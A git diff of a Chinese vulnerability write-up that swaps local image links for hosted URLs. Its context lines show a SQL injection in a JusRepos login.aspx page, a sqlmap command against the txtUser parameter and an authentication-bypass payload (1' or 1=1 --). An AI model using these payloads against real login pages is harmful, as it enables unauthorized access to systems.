@@ -20,7 +20,7 @@
 
 进入页面如下
 
-![](image/fy-1.png)
+![](http://wikioss.peiqi.tech/vuln/fy-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 出现漏洞的Url为
 
@@ -28,7 +28,7 @@
 http://xxxxxxx/JusRepos/ui/login.aspx
 ```
 
-![](image/fy-2.png)
+![](http://wikioss.peiqi.tech/vuln/fy-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 抓取登录的请求包
 
@@ -59,7 +59,7 @@ __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W
 sqlmap -r sql.txt -p txtUser
 ```
 
-![](image/fy-3.png)
+![](http://wikioss.peiqi.tech/vuln/fy-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 同时还存在着万能密码可以直接登录后台
 
@@ -68,4 +68,4 @@ user: 1' or 1=1 --
 pass: peiqi
 ```
 
-![](image/fy-7.png)
+![](http://wikioss.peiqi.tech/vuln/fy-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
